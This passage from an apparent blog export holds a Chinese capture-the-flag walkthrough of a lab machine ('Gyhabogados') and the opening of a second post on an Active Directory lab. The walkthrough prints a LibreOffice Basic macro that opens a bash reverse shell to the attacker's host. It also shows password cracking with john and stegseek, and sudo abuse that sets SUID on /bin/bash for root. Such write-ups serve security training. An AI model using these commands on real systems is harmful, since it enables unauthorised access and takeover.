\u6587\u4ef6\n192.168.205.131 gyhabogados.thl\n```\n\n**\u5b50\u57df\u540d\u7206\u7834**\n\n\u7531\u4e8e\u53d1\u73b0\u4e86\u90ae\u4ef6\u670d\u52a1\u7aef\u53e3\uff0c\u63a8\u6d4b\u53ef\u80fd\u5b58\u5728\u5982`mail`\u4e4b\u7c7b\u7684\u5b50\u57df\u540d\u3002\u4f7f\u7528`wfuzz`\u7ed3\u5408`HOST`\u5934\u5bf9\u5b50\u57df\u540d\u8fdb\u884c\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ wfuzz -c -u 'http://gyhabogados.thl' -H 'HOST:FUZZ.gyhabogados.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 671\n...\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                          \n=====================================================================\n000000002:   200        96 L     343 W      5580 Ch     'mail - mail' \n...\n```\n\n\u6210\u529f\u53d1\u73b0\u5b50\u57df\u540d `mail.gyhabogados.thl`\uff0c\u540c\u6837\u5c06\u5176\u6dfb\u52a0\u5230`/etc/hosts`\u6587\u4ef6\u3002\n\n**\u76ee\u5f55\u626b\u63cf**\n\n\u63a5\u7740\u4f7f\u7528`gobuster`\u5bf9\u4e3b\u7ad9\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u5bfb\u627e\u53ef\u5229\u7528\u7684\u8def\u5f84\u6216\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://gyhabogados.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64\n...\n/uploads              (Status: 301) [Size: 320] [--> http://gyhabogados.thl/uploads/]\n/images               (Status: 301) [Size: 319] [--> http://gyhabogados.thl/images/]\n/index.php            (Status: 200) [Size: 7760]\n/config               (Status: 301) [Size: 319] [--> http://gyhabogados.thl/config/]\n/roundcube            (Status: 301) [Size: 322] [--> http://gyhabogados.thl/roundcube/]\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e9b\u5173\u952e\u76ee\u5f55\uff0c\u5982 `/uploads`\u3001`/config`\uff0c\u4ee5\u53ca\u4e00\u4e2aWebmail\u7cfb\u7edf `/roundcube`\u3002\n\n# \u4e8c\u3001\u6f0f\u6d1e\u5229\u7528\u4e0e\u521d\u6b65\u8bbf\u95ee\n\n\u91cd\u65b0\u8bbf\u95ee\u7f51\u7ad9\uff0c\u5728`http://gyhabogados.thl/work-with-us.php`\u9875\u9762\u53d1\u73b0\u4e86\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\uff0c\u5141\u8bb8\u6c42\u804c\u8005\u4e0a\u4f20\u7b80\u5386\u3002\u6d4b\u8bd5\u53d1\u73b0\u8be5\u529f\u80fd\u4f3c\u4e4e\u4f1a\u5bf9\u6587\u6863\u6587\u4ef6\u8fdb\u884c\u5904\u7406\uff0c\u8fd9\u53ef\u80fd\u662f\u4e00\u4e2a\u653b\u51fb\u5165\u53e3\u3002\n\n\u6211\u4eec\u5c1d\u8bd5\u6784\u9020\u4e00\u4e2a\u5305\u542b\u53cd\u5411Shell\u5b8f\u7684`.odt`\uff08OpenDocument Text\uff09\u6587\u4ef6\u3002\u5f53\u670d\u52a1\u5668\u7aef\u5e94\u7528\uff08\u5982LibreOffice\uff09\u6253\u5f00\u6b64\u6587\u4ef6\u4ee5\u89e3\u6790\u5176\u5185\u5bb9\u65f6\uff0c\u53ef\u80fd\u4f1a\u81ea\u52a8\u6267\u884c\u5b8f\uff0c\u4ece\u800c\u89e6\u53d1\u6211\u4eec\u7684Payload\u3002\n\n**\u5b8f\u5236\u4f5c**\n\n1. \u5728LibreOffice Writer\u4e2d\uff0c\u901a\u8fc7 `\u5de5\u5177 -> \u5b8f -> \u7ba1\u7406\u5b8f -> Basic` \u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b8f\u3002\n\n2. \u5199\u5165\u7528\u4e8e\u521b\u5efa\u53cd\u5411Shell\u7684Basic\u811a\u672c\u4ee3\u7801\u3002\u4ee5\u4e0b\u4e3a\u793a\u4f8b\uff1a\n\n   ```basic\n   Sub Main\n       Dim command as String\n       command = 'bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1''\n       Shell(command)\n   End Sub\n   ```\n\n3. \u5c06\u6b64\u5b8f\u7ed1\u5b9a\u5230\u6587\u6863\u7684\u201c\u6253\u5f00\u6587\u6863\u201d\u4e8b\u4ef6\u4e0a\uff0c\u5e76\u4fdd\u5b58\u4e3a`.odt`\u683c\u5f0f\u3002\n\n**\u83b7\u53d6Shell**\n\n\u5728Kali\u4e0a\u8bbe\u7f6e`netcat`\u76d1\u542c8888\u7aef\u53e3\uff0c\u7136\u540e\u901a\u8fc7\u7f51\u7ad9\u4e0a\u4f20\u6784\u9020\u597d\u7684`.odt`\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888                 \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 55862\nbash: cannot set terminal process group (2362): Inappropriate ioctl for device\nbash: no job control in this shell\nbash: /home/bob/.bashrc: Permission denied\nbob@TheHackersLabs-Gyhabogados:~$ id\nuid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo),100(users)\n```\n\n\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39Shell\uff0c\u5f53\u524d\u7528\u6237\u4e3a`bob`\u3002\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. Shell\u7a33\u5b9a\u5316\n\n\u4e3a\u4e86\u66f4\u597d\u7684\u4ea4\u4e92\u4f53\u9a8c\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5e8f\u5217\u5c06\u7b80\u6613Shell\u5347\u7ea7\u4e3a\u529f\u80fd\u5b8c\u6574\u7684TTY\u3002\n\n```bash\nscript /dev/null -c bash\n# \u6309\u4e0b Ctrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80\n```\n\n## 2. bob -> sam\n\n\u5728\u4e4b\u524d\u76ee\u5f55\u626b\u63cf\u53d1\u73b0\u7684 `/config` \u76ee\u5f55\u4e2d\uff0c\u67e5\u627e\u654f\u611f\u4fe1\u606f\u3002\n\n```bash\nbob@TheHackersLabs-Gyhabogados:/var/www/html/config$ cat db.php \n<?php\n\n$mysqli = mysqli_connect('127.0.0.1', 'bob', 'sup3rS3cretP4ssword_2024!', 'candidatos');\n\nif (mysqli_error($mysqli)) {\n  die('Ocurrio un error al conectarse a la base de datos ' . mysqli_error($mysqli));\n}\n```\n\n\u53d1\u73b0\u4e86\u6570\u636e\u5e93\u51ed\u636e `bob:sup3rS3cretP4ssword_2024!`\u3002\u5c1d\u8bd5\u4f7f\u7528\u8be5\u5bc6\u7801\u5207\u6362\u7528\u6237\u6216\u6267\u884csudo\uff0c\u4f46\u5747\u5931\u8d25\u3002\n\n\u56de\u5230`bob`\u7528\u6237\u7684\u4e3b\u76ee\u5f55\uff0c\u53d1\u73b0\u4e00\u4e2a\u52a0\u5bc6\u76847z\u538b\u7f29\u6587\u4ef6 `credentials.7z`\u3002\n\n```bash\nbob@TheHackersLabs-Gyhabogados:~$ ls\ncredentials.7z\n```\n\n\u4f7f\u7528`scp`\u5c06\u5176\u4f20\u8f93\u56deKali\u8fdb\u884c\u7834\u89e3\u3002\n\n```bash\nbob@TheHackersLabs-Gyhabogados:~$ scp credentials.7z kali@192.168.205.128:/mnt/hgfs/gx/x/tmp\n```\n\n\u5728Kali\u4e0a\uff0c\u4f7f\u7528`7z2john`\u63d0\u53d6\u54c8\u5e0c\uff0c\u7136\u540e\u7528`john`\u548c`rockyou.txt`\u5b57\u5178\u8fdb\u884c\u7834\u89e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z2john credentials.7z > hash\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\n...\nbarcelona        (credentials.7z)     \n...\n```\n\n\u5bc6\u7801\u6210\u529f\u7834\u89e3\u4e3a `barcelona`\u3002\u89e3\u538b\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x credentials.7z\n...\nEnter password (will not be echoed):\n...\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat credentials.txt\nbob:a7gyqqp6bt2!uv@2u\n```\n\n\u5f97\u5230\u4e00\u5bf9\u65b0\u51ed\u636e `bob:a7gyqqp6bt2!uv@2u`\u3002\u7ed3\u5408\u4e4b\u524d\u53d1\u73b0\u7684webmail\u7cfb\u7edf\uff08`http://mail.gyhabogados.thl/roundcube/`\uff09\uff0c\u4f7f\u7528\u6b64\u51ed\u636e\u767b\u5f55`bob`\u7684\u90ae\u7bb1\u3002\n\n\u5728\u90ae\u7bb1\u4e2d\uff0c\u53d1\u73b0\u4e86\u4e00\u5c01\u5305\u542b`sam`\u7528\u6237\u51ed\u636e\u7684\u90ae\u4ef6\u3002\n\n> **\u90ae\u4ef6\u5185\u5bb9\u6458\u8981:**\n> Usuario: sam\n> Contrase\u00f1a: Welcome2024!\n\n\u4f7f\u7528`su`\u547d\u4ee4\u548c\u65b0\u83b7\u53d6\u7684\u5bc6\u7801\u5207\u6362\u5230`sam`\u7528\u6237\u3002\n\n```bash\nbob@TheHackersLabs-Gyhabogados:~$ su sam\nPassword: Welcome2024!\nsam@TheHackersLabs-Gyhabogados:/home/bob$ id\nuid=1002(sam) gid=1006(abogados) groups=1006(abogados),100(users)\n```\n\n## 3. sam -> dean\n\n\u6210\u4e3a`sam`\u7528\u6237\u540e\uff0c\u67e5\u770b`/etc/samba/smb.conf`\u6587\u4ef6\uff0c\u53d1\u73b0\u5728\u591a\u4e2aSamba\u5171\u4eab\u4e2d\uff0c`sam`\u53ef\u4ee5\u8bbf\u95ee `[CONFIDENCIALES]` \u548c `[RESPALDOS_IT]`\u3002\n\n```bash\nsam@TheHackersLabs-Gyhabogados:/tmp$ cat /etc/samba/smb.conf\n...\n[RESPALDOS_IT]\n  comment = Respaldos IT\n  path = /mnt/RESPALDOS_IT\n  ...\n  valid users = sam, dean\n```\n\n\u68c0\u67e5 `/mnt/RESPALDOS_IT` \u76ee\u5f55\u5185\u5bb9\u3002\n\n```bash\nsam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ ls -al\ntotal 16\ndrwxr-x--- 2 root abogados 4096 Dec  8  2024 .\ndrwxr-xr-x 5 root root     4096 Dec  8  2024 ..\n-rw-r--r-- 1 root abogados  520 Dec  8  2024 credenciales.psafe3\n-rw-r--r-- 1 root abogados  582 Dec  7  2024 IMPORTANTE.txt\n\nsam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ cat IMPORTANTE.txt\n...\nLa contrase\u00f1a maestra es similar a la que te proporcion\u00e9 en la bienvenida: 'ChevyImpala1967'. Sin embargo, en lugar de '1967', deber\u00e1s usar un a\u00f1o diferente.\n```\n\n\u53d1\u73b0\u4e00\u4e2a`PasswordSafe`\u7684\u5bc6\u7801\u5e93\u6587\u4ef6 `credenciales.psafe3` \u548c\u4e00\u4e2a\u63d0\u793a\u6587\u4ef6\u3002\u63d0\u793a\u8868\u660e\u4e3b\u5bc6\u7801\u683c\u5f0f\u4e3a `ChevyImpala` \u52a0\u4e0a\u4e00\u4e2a\u5e74\u4efd\u3002\n\n\u5c06`credenciales.psafe3`\u4f20\u8f93\u5230Kali\uff0c\u5e76\u751f\u6210\u4e00\u4e2a\u5e74\u4efd\u5b57\u5178\u8fdb\u884c\u7834\u89e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ seq -f 'ChevyImpala%g' 1967 2025 > p\n\u2514\u2500$ pwsafe2john credenciales.psafe3 > hash\n\u2514\u2500$ john --wordlist=p hash\n...\nChevyImpala1995  (credencial)\n...\n```\n\n\u5bc6\u7801\u5e93\u4e3b\u5bc6\u7801\u4e3a `ChevyImpala1995`\u3002\u4f7f\u7528`pwsafe`\u7b49\u5de5\u5177\u6253\u5f00\u5bc6\u7801\u5e93\uff0c\u53d1\u73b0\u5176\u4e2d\u5b58\u50a8\u4e86`dean`\u7528\u6237\u7684\u51ed\u636e\u3002\n\n> **\u5bc6\u7801\u5e93\u5185\u5bb9:**\n> dean:MasterOfPuppets1986\n\n\u5207\u6362\u5230`dean`\u7528\u6237\u3002\n\n```bash\nsam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ su dean\nPassword: MasterOfPuppets1986\ndean@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ id\nuid=1001(dean) gid=1006(abogados) groups=1006(abogados),100(users)\n```\n\n## 4. dean -> john\n\n`dean`\u7528\u6237\u540c\u6837\u53ef\u4ee5\u8bbf\u95eeSamba\u5171\u4eab\u3002\u68c0\u67e5 `[IT_TOOLS]` \u5171\u4eab\u3002\n\n```bash\ndean@TheHackersLabs-Gyhabogados:~$ cd /mnt/IT_TOOLS/\ndean@TheHackersLabs-Gyhabogados:/mnt/IT_TOOLS$ ls -al\ntotal 12\ndrwxr-x--- 2 root it   4096 Dec  8  2024 .\ndrwxr-xr-x 5 root root 4096 Dec  8  2024 ..\n-rw-r--r-- 1 root root 1458 Dec  7  2024 private_key.ppk\n```\n\n\u53d1\u73b0\u4e86\u4e00\u4e2a`PuTTY`\u683c\u5f0f\u7684\u79c1\u94a5\u6587\u4ef6 `private_key.ppk`\u3002\u67e5\u770b\u5176\u5185\u5bb9\u53ef\u77e5\u8be5\u5bc6\u94a5\u672a\u52a0\u5bc6\u3002\n\n```bash\ndean@TheHackersLabs-Gyhabogados:/mnt/IT_TOOLS$ strings private_key.ppk\nPuTTY-User-Key-File-3: ssh-rsa\nEncryption: none\n...\n```\n\n\u5c06\u79c1\u94a5\u4f20\u8f93\u56deKali\uff0c\u5e76\u4f7f\u7528`puttygen`\u8f6c\u6362\u4e3aOpenSSH\u683c\u5f0f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ puttygen private_key.ppk -O private-openssh -o /tmp/id_rsa\n\u2514\u2500$ chmod 600 /tmp/id_rsa\n```\n\n\u6839\u636e`/home`\u76ee\u5f55\u4e0b\u7684\u7528\u6237\u5217\u8868\uff0c\u63a8\u6d4b\u8be5\u5bc6\u94a5\u5c5e\u4e8e`john`\u7528\u6237\u3002\u5c1d\u8bd5\u4f7f\u7528\u8be5\u5bc6\u94a5SSH\u767b\u5f55\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ssh john@192.168.205.131 -i /tmp/id_rsa\n...\njohn@TheHackersLabs-Gyhabogados:~$ id\nuid=1003(john) gid=1003(john) groups=1003(john),100(users),1005(it)\n```\n\n\u6210\u529f\u4ee5`john`\u7528\u6237\u8eab\u4efd\u767b\u5f55\u3002\n\n## 5. john -> root\n\n\u767b\u5f55\u540e\uff0c\u68c0\u67e5`john`\u7684`sudo`\u6743\u9650\uff0c\u63d0\u793a\u9700\u8981\u5bc6\u7801\u3002\n\n```bash\njohn@TheHackersLabs-Gyhabogados:~$ sudo -l\n[sudo] password for john: \nsudo: a password is required\n```\n\n\u5728\u4e4b\u524d`dean`\u7528\u6237\u7684\u90ae\u7bb1\u4e2d\uff0c\u66fe\u53d1\u73b0\u4e00\u5f20\u540d\u4e3a`impala_67.jpg`\u7684\u56fe\u7247\u3002\u8fd9\u901a\u5e38\u6697\u793a\u4e86\u9690\u5199\u672f\u3002\u901a\u8fc7\u4f7f\u7528\u9690\u5199\u5de5\u5177\uff08\u5982`stegseek`\uff09\u5206\u6790\u8be5\u56fe\u7247\uff0c\u53ef\u4ee5\u63d0\u53d6\u51fa`john`\u7528\u6237\u7684\u5bc6\u7801\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ stegseek impala_67.jpg                              \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: 'ironmaiden'\n[i] Original filename: 'credentials.txt'.\n[i] Extracting to 'impala_67.jpg.out'.\n...\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat impala_67.jpg.out\njohn: TI!Powerful2024\n```\n\n\u83b7\u53d6\u5230\u5bc6\u7801 `john:TI!Powerful2024`\u3002\u518d\u6b21\u68c0\u67e5`sudo`\u6743\u9650\u3002\n\n```bash\njohn@TheHackersLabs-Gyhabogados:~$ sudo -l\n[sudo] password for john: TI!Powerful2024\n...\nUser john may run the following commands on TheHackersLabs-Gyhabogados:\n    (ALL) PASSWD: /usr/bin/python3 /home/john/tools/backup.py\n```\n\n`john`\u7528\u6237\u53ef\u4ee5\u4ee5root\u6743\u9650\u6267\u884c\u4e00\u4e2a\u4f4d\u4e8e`/home/john/tools/backup.py`\u7684Python\u811a\u672c\u3002\u4f46\u68c0\u67e5\u53d1\u73b0\u8be5\u6587\u4ef6\u548c\u76ee\u5f55\u5e76\u4e0d\u5b58\u5728\u3002\n\n```bash\njohn@TheHackersLabs-Gyhabogados:~$ ls -al /home/john/tools/backup.py\nls: cannot access '/home/john/tools/backup.py': No such file or directory\n```\n\n\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684sudo\u6743\u9650\u914d\u7f6e\u9519\u8bef\u3002\u6211\u4eec\u53ef\u4ee5\u81ea\u884c\u521b\u5efa\u8be5\u811a\u672c\uff0c\u5e76\u5199\u5165\u63d0\u6743\u4ee3\u7801\u3002\u8fd9\u91cc\u9009\u62e9\u4e3a`/bin/bash`\u6dfb\u52a0SUID\u6743\u9650\u4f4d\u3002\n\n```bash\njohn@TheHackersLabs-Gyhabogados:~$ echo 'import os; os.system('chmod +s /bin/bash')' > /home/john/tools/backup.py\n```\n\n\u6267\u884c`sudo`\u547d\u4ee4\u89e6\u53d1Payload\u3002\n\n```bash\njohn@TheHackersLabs-Gyhabogados:~$ sudo /usr/bin/python3 /home/john/tools/backup.py\njohn@TheHackersLabs-Gyhabogados:~$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1265648 Mar 29  2024 /bin/bash\n```\n\n\u53ef\u4ee5\u770b\u5230`/bin/bash`\u5df2\u6210\u529f\u8bbe\u7f6eSUID\u4f4d\u3002\u73b0\u5728\u6267\u884c`bash -p`\u5373\u53ef\u83b7\u5f97\u4e00\u4e2aeuid\u4e3a0\u7684root\u6743\u9650Shell\u3002\n\n```bash\njohn@TheHackersLabs-Gyhabogados:~$ bash -p\nbash-5.2# id\nuid=1003(john) gid=1003(john) euid=0(root) egid=0(root) groups=0(root),100(users),1003(john),1005(it)\n```\n\n# \u56db\u3001\u83b7\u53d6\u51ed\u8bc1\n\n\u6210\u529f\u63d0\u6743\u81f3root\u540e\uff0c\u8bfb\u53d6\u6700\u7ec8\u7684flag\u6587\u4ef6\u3002\n\n```bash\nbash-5.2# cat /home/dean/user.txt\n930b5a4b9098abfdaa67f93a937593bf\n\nbash-5.2# cat /root/notes.txt | grep Flag\nFlag: 63baa2b1cd7ac490cf34e7c6a317067b\n```\n\n\u6210\u529f\u83b7\u53d6user\u548croot\u4e24\u4e2aflag\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1755399601, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-17", "dateLabelColor": "#0969da"}, "P219": {"htmlDir": "docs/post/nei-bu-_bicker.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_bicker", "postUrl": "post/nei-bu-_bicker.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/219", "commentNum": 0, "wordCount": 15816, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u6e17\u900f\u6d4b\u8bd5\u7684\u8d77\u70b9\u662f\u5728\u76ee\u6807\u7f51\u7edc\u4e2d\u8bc6\u522b\u5b58\u6d3b\u4e3b\u673a\u3002\u6211\u4eec\u901a\u8fc7 `arp-scan` \u5bf9\u672c\u5730\u7f51\u6bb5\u8fdb\u884c\u626b\u63cf\uff0c\u4ee5\u5b9a\u4f4d\u6211\u4eec\u7684\u76ee\u6807\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l      \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.149 00:0c:29:07:21:7a       VMware, Inc.\n192.168.205.254 00:50:56:ff:e4:86       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.994 seconds (128.39 hosts/sec). 4 responded\n```\n\u626b\u63cf\u7ed3\u679c\u660e\u786e\u6307\u5411 `192.168.205.149` \u4e3a\u672c\u6b21\u6d4b\u8bd5\u7684\u76ee\u6807\u4e3b\u673a\u3002\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u786e\u5b9a\u76ee\u6807 IP \u540e\uff0c\u4f7f\u7528 Nmap \u8fdb\u884c\u6df1\u5ea6\u63a2\u6d4b\uff0c\u4ee5\u7ed8\u5236\u51fa\u76ee\u6807\u7684\u653b\u51fb\u9762\u3002\u9996\u5148\u8fdb\u884c\u5168\u7aef\u53e3 TCP \u8fde\u63a5\u626b\u63cf\uff0c\u786e\u4fdd\u4e0d\u9057\u6f0f\u4efb\u4f55\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 -sT -T4 192.168.205.149 -oA nmapscan/ports \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:37 EDT\nNmap scan report for bicker.com (192.168.205.149)\nHost is up (0.00048s latency).\nNot shown: 65517 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n3389/tcp  open  ms-wbt-server\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49669/tcp open  unknown\n63661/tcp open  unknown\n63662/tcp open  unknown\n63682/tcp open  unknown\nMAC Address: 00:0C:29:07:21:7A (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 90.01 seconds\n```\n\u5728\u8bc6\u522b\u51fa\u5f00\u653e\u7aef\u53e3\u540e\uff0c\u6211\u4eec\u9488\u5bf9\u8fd9\u4e9b\u7aef\u53e3\u8fdb\u884c\u66f4\u8be6\u7ec6\u7684\u670d\u52a1\u7248\u672c\u63a2\u6d4b\u548c\u9ed8\u8ba4\u811a\u672c\u626b\u63cf\uff0c\u4ee5\u83b7\u53d6\u64cd\u4f5c\u7cfb\u7edf\u3001\u57df\u540d\u3001\u4e3b\u673a\u540d\u7b49\u5173\u952e\u4fe1\u606f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,63661,63662,63682 -sC -sV -T4 192.168.205.149 -oA nmapscan/xiports\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:40 EDT\nNmap scan report for bicker.com (192.168.205.149)\nHost is up (0.00023s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-16 13:40:55Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bicker.com0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n...\n| rdp-ntlm-info: \n|   Target_Name: BICKER\n|   NetBIOS_Domain_Name: BICKER\n|   NetBIOS_Computer_Name: DC\n|   DNS_Domain_Name: bicker.com\n|   DNS_Computer_Name: dc.bicker.com\n...\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n...\n```\n\n**\u626b\u63cf\u7ed3\u679c\u5206\u6790\u4e0e\u89e3\u8bfb\uff1a**\n\u7efc\u5408\u626b\u63cf\u7ed3\u679c\uff0c\u76ee\u6807\u4e3b\u673a\u7684\u753b\u50cf\u53d8\u5f97\u6781\u4e3a\u6e05\u6670\uff1a\u8fd9\u662f\u4e00\u53f0\u4e3b\u673a\u540d\u4e3a `DC` \u7684 Windows \u57df\u63a7\u5236\u5668\uff0c\u5176 DNS \u57df\u540d\u4e3a `bicker.com`\u3002\u5927\u91cf\u5f00\u653e\u7684 AD \u76f8\u5173\u7aef\u53e3\uff08Kerberos, LDAP, SMB\uff09\u8bc1\u5b9e\u4e86\u8fd9\u4e00\u70b9\u3002\u4e00\u4e2a\u91cd\u8981\u7684\u53d1\u73b0\u662f SMB \u7b7e\u540d\u88ab\u5f3a\u5236\u542f\u7528\uff08`Message signing enabled and required`\uff09\uff0c\u8fd9\u589e\u52a0\u4e86\u7f51\u7edc\u5c42\u7684\u5b89\u5168\u6027\uff0c\u53ef\u4ee5\u6709\u6548\u9632\u5fa1 NTLM Relay \u7b49\u4e2d\u95f4\u4eba\u653b\u51fb\u3002\n\n| \u7aef\u53e3          | \u670d\u52a1          | \u4f5c\u7528/\u98ce\u9669\u63d0\u793a                                                |\n| ------------- | ------------- | ------------------------------------------------------------ |\n| **53/tcp**    | DNS           | \u57df\u540d\u7cfb\u7edf\uff0c\u53ef\u7528\u4e8e\u679a\u4e3e SRV \u8bb0\u5f55\uff0c\u7ed8\u5236\u57df\u5185\u670d\u52a1\u62d3\u6251\u3002            |\n| **88/tcp**    | Kerberos      | \u57df\u8ba4\u8bc1\u6838\u5fc3\uff0c\u662f\u8fdb\u884c\u7528\u6237\u540d\u679a\u4e3e\uff08Kerbrute\uff09\u548c AS-REP Roasting \u653b\u51fb\u7684\u5207\u5165\u70b9\u3002 |\n| **139/445**   | SMB           | \u6587\u4ef6\u5171\u4eab\u670d\u52a1\uff0c\u53ef\u7528\u4e8e\u679a\u4e3e\u5171\u4eab\u3001\u68c0\u67e5 Null Session \u6f0f\u6d1e\u3002       |\n| **389/636**   | LDAP/LDAPS    | \u8f7b\u91cf\u7ea7\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff0c\u662f\u67e5\u8be2 AD \u6570\u636e\u5e93\u4ee5\u83b7\u53d6\u7528\u6237\u3001\u7ec4\u3001OU \u7b49\u4fe1\u606f\u7684\u6807\u51c6\u63a5\u53e3\u3002 |\n| **3268/3269** | \u5168\u5c40\u7f16\u5f55 (GC) | AD\u6797\u7684\u7d22\u5f15\u670d\u52a1\uff0c\u5141\u8bb8\u5728\u4e0d\u77e5\u9053\u5bf9\u8c61\u6240\u5728\u57df\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u5feb\u901f\u641c\u7d22\u3002 |\n| **5985/tcp**  | WinRM (HTTP)  | Windows \u8fdc\u7a0b\u7ba1\u7406\u670d\u52a1\uff0c\u83b7\u5f97\u51ed\u636e\u540e\uff0c\u8fd9\u662f\u6267\u884c PowerShell \u547d\u4ee4\u3001\u5b9e\u73b0\u4ea4\u4e92\u5f0f\u63a7\u5236\u7684\u9996\u9009\u901a\u9053\u3002 |\n| **3389/tcp**  | RDP           | \u8fdc\u7a0b\u684c\u9762\u534f\u8bae\uff0c\u662f\u56fe\u5f62\u5316\u767b\u5f55\u7684\u5165\u53e3\uff0c\u53ef\u7528\u4e8e\u51ed\u636e\u7206\u7834\u6216\u54c8\u5e0c\u4f20\u9012\u3002 |\n\n## 3. Active Directory 